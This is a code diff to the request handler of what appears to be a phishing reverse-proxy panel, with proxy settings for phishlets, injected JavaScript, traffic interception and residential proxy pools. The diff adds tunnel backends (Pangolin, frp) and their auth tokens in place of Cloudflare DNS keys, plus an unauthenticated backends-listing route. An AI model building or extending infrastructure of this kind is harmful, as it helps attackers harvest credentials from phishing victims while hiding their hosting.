@@ -917,8 +917,8 @@ async function handleRequest(req, res) {
         hits: 0,
         proxyDomain: "",
         interceptEnabled: false,
-        cfZoneId: "",
-        cfRecordId: "",
+        tunnelBackend: body?.tunnelBackend || "direct",
+        tunnelId: null,
         injectJs: body?.injectJs || "",
         injectJsEnabled: false,
         phishlet: body?.phishlet || "",
@@ -956,6 +956,8 @@ async function handleRequest(req, res) {
         proxies[idx].injectJsEnabled = Boolean(body.injectJsEnabled);
       if (body?.phishlet !== undefined)
         proxies[idx].phishlet = String(body.phishlet);
+      if (body?.tunnelBackend !== undefined)
+        proxies[idx].tunnelBackend = String(body.tunnelBackend);
       proxies[idx].updatedAt = Date.now();
       broadcast("proxies:changed");
       return json(res, 200, { success: true, data: proxies[idx] }, cors);
@@ -1347,11 +1349,14 @@ async function handleRequest(req, res) {
         "INTERCEPT_BLOCKLIST",
         "INTERCEPT_TTL_SECONDS",
         "API_KEY",
-        "CF_API_KEY",
-        "CF_API_EMAIL",
-        "CF_API_TOKEN",
         "PROXY_TARGET",
         "BASE_DOMAIN",
+        "DEFAULT_TUNNEL_BACKEND",
+        "PANGOLIN_CONTROL_PLANE",
+        "PANGOLIN_AUTH_TOKEN",
+        "FRPS_ADDR",
+        "FRPS_PORT",
+        "FRP_AUTH_TOKEN",
         "RESIDENTIAL_PROXY_POOL",
       ];
       for (const [k, v] of Object.entries(body)) {
@@ -1488,6 +1493,12 @@ async function handleRequest(req, res) {
   }
 
   // POST /api/proxy/servers/validate — Grok Build 0.1 validates a config
+  // GET /api/proxy/backends — list available tunneling backends
+  if (pathname === "/api/proxy/backends" && method === "GET") {
+    const result = await proxyManagerFetch("/api/proxy/backends");
+    return json(res, result.status, result.body, cors);
+  }
+
   if (pathname === "/api/proxy/servers/validate" && method === "POST") {
     const authErr = checkAuth(req);
     if (authErr) return json(res, authErr.status, authErr.body, cors);
